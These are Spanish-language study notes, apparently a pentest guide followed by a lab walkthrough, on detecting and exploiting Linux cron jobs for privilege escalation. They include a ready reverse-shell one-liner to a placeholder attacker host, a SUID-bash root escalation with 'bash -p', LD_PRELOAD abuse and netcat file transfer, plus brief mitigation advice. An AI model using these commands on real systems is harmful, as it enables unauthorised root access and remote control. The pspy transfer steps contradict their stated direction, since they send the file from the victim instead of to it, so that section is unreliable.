
-------

Aquí tienes una guía sobre la **detección y explotación de tareas cron** en sistemas Linux. Las tareas cron permiten programar la ejecución automática de scripts o comandos a intervalos específicos, y pueden ser un vector de ataque si no se gestionan correctamente.

### 1. **Detección de Tareas Cron**

- **Listar Tareas de Cron de un Usuario**: Puedes listar las tareas programadas para el usuario actual con:

    
    `crontab -l`
    
- **Listar Tareas de Cron de Otros Usuarios**: Si tienes acceso root, puedes ver las tareas cron de otros usuarios en:
    

    
    `sudo crontab -u username -l`
    
- **Verificar Archivos de Cron Globales**: Las tareas cron también pueden estar configuradas en archivos como:
    - `/etc/crontab`
    - `/etc/cron.d/`
    - `/var/spool/cron/crontabs/`

Para listar las tareas cron globales, puedes usar:



`cat /etc/crontab ls -l /etc/cron.d/`

### 2. **Identificación de Vulnerabilidades**

- **Permisos Incorrectos**: Verifica los permisos de los scripts o archivos ejecutados por cron. Si un script tiene permisos de escritura para usuarios no autorizados, puede ser modificado.
- **Tareas que se Ejecutan con Privilegios Elevados**: Identifica si hay tareas que se ejecutan como root o con permisos elevados. Esto incluye scripts ubicados en `/etc/cron.d/` o archivos de crontab de root.

### 3. **Explotación de Tareas Cron**

- **Modificar Scripts Cron**: Si puedes acceder a un script ejecutado por cron y tiene permisos de escritura, puedes inyectar código malicioso. Por ejemplo:
    - Si encuentras un script en `/etc/cron.d/myscript.sh`, edítalo para agregar una línea que abra un shell o ejecute un comando específico.
- **Crear un Script Malicioso**: Si un script cron ejecuta un archivo específico, puedes crear un archivo malicioso con el mismo nombre en la misma ruta y añadirlo a la carpeta de ejecución.
    
    `echo "/bin/bash -i >& /dev/tcp/attacker_ip/port 0>&1" > /path/to/script.sh chmod +x /path/to/script.sh`
    
- **Inyección de Comandos**: Si el cron llama a un comando que permite la inyección de parámetros (como `curl` o `wget`), puedes intentar manipularlo para ejecutar tu propio script.

### 4. **Escalación de Privilegios**

- **Ejecutar Código como Root**: Si has modificado un script cron que se ejecuta con privilegios de root, cualquier código que agregues se ejecutará con esos mismos privilegios.
- **Uso de Variables de Entorno**: Algunas tareas cron no limpian adecuadamente las variables de entorno. Puedes establecer `LD_PRELOAD` o variables similares para ejecutar código malicioso cuando se ejecute el script.

### 5. **Mitigación**

- **Revisar y Auditar Tareas Cron**: Realiza auditorías periódicas de las tareas cron para identificar configuraciones inseguras o scripts con permisos incorrectos.
- **Limitar Permisos de Archivos**: Asegúrate de que solo usuarios autorizados puedan modificar scripts ejecutados por cron. Usa permisos restrictivos para archivos críticos.
- **Monitorear Cambios en Scripts Cron**: Implementa un sistema de monitoreo para detectar cambios no autorizados en scripts y archivos relacionados con cron.

Esta guía proporciona una visión general sobre la detección y explotación de tareas cron. Recuerda realizar estas acciones de manera ética y solo en entornos donde tengas permiso para hacerlo.

---------

Primero, instalamos el paquete con el comando:


`sudo apt install cron`

![[Pasted image 20241026192859.png]]

Y con el comando `crontab -e`, puedes acceder a las configuraciones de las tareas cron. A continuación, definimos la siguiente tarea:



`* * * * * /ruta/al/script.sh`

Esta tarea ejecutará el script ubicado en `/ruta/al/script.sh` cada minuto. Asegúrate de que el script tenga permisos de ejecución.

![[Pasted image 20241026193042.png]]

Para detectar qué scripts tienen asignadas tareas cron, podemos hacer lo siguiente:

![[Pasted image 20241026193334.png]]

![[Pasted image 20241026193350.png]]

En el script `procmon.sh`, podrías incluir las siguientes líneas para detectar las tareas cron que se están ejecutando en el sistema:

![[Pasted image 20241026193815.png]]

Así, podemos ver qué tareas cron se están ejecutando y los recursos pertinentes. Al ejecutar el script `procmon.sh`, obtendremos un informe detallado de todas las tareas cron activas, incluyendo:

![[Pasted image 20241026194024.png]]

Así, podrías editar el `script.sh` añadiéndole un permiso SUID a un comando de bin que desees de la siguiente manera:

![[Pasted image 20241026194203.png]]

Y así, una vez la tarea cron ejecute el script, el binario de `bash` ya tendrá permisos SUID, permitiendo que cualquier usuario lo ejecute como root.

Para lanzar una shell de `bash` con privilegios de root de la siguiente manera, puedes usar el siguiente comando:

```bash
bash -p
```

Y de la siguiente manera, podemos transferir la herramienta **pspy** a nuestra máquina víctima a través de TCP de la siguiente forma:

1. **Iniciar un Servidor TCP en tu Máquina de Ataque**: Utiliza un servidor simple para recibir el archivo. Por ejemplo, puedes usar `nc` (netcat) para crear un servidor en un puerto específico:
    
    
    `nc -lvnp 4444 > pspy`
    
    Esto escuchará en el puerto 4444 y guardará cualquier dato recibido en un archivo llamado `pspy`.
    
2. **Transferir pspy desde la Máquina Víctima**: Desde la máquina víctima, usa `nc` para enviar el archivo a tu máquina de ataque. Asegúrate de que tienes el archivo `pspy` en la ruta correcta:
    
    `nc <IP_de_tu_maquina_atacante> 4444 < /ruta/a/pspy`
    
    Reemplaza `<IP_de_tu_maquina_atacante>` con la dirección IP de tu máquina atacante.
    
3. **Verificar la Transferencia**: Una vez que hayas enviado el archivo, verifica que el archivo `pspy` haya sido transferido correctamente a tu máquina de ataque. Puedes usar `ls` para comprobar su existencia:
    
    
    `ls -l pspy`

![[Pasted image 20241026194809.png]]

y se podrían ver todas las ejecuciones de las tareas cron

![[Pasted image 20241026194850.png]]



